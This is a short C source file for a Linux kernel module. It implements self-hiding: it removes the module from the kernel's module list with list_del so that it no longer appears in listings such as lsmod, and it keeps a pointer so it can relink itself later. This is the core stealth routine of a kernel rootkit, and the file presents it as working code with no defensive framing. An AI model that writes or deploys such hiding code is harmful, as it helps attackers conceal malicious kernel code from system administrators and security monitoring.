/*
 * hide_module.c - Provides basic implementation for module hiding
 *
 * Omer Kfir (C)
 */

#include "hide_module.h"

static int hidden = 0;
static struct list_head *prev_module;

void hide_this_module(void) {
  if (hidden)
    return;

  // Store the pointers to restore later
  prev_module = THIS_MODULE->list.prev;

  // Remove from the list
  list_del(&THIS_MODULE->list);

  hidden = 1;
  printk(KERN_INFO "Module hidden\n");
}

void unhide_this_module(void) {
  if (!hidden)
    return;

  // Restore module to the list
  list_add(&THIS_MODULE->list, prev_module);

  hidden = 0;
  printk(KERN_INFO "Module unhidden\n");
}
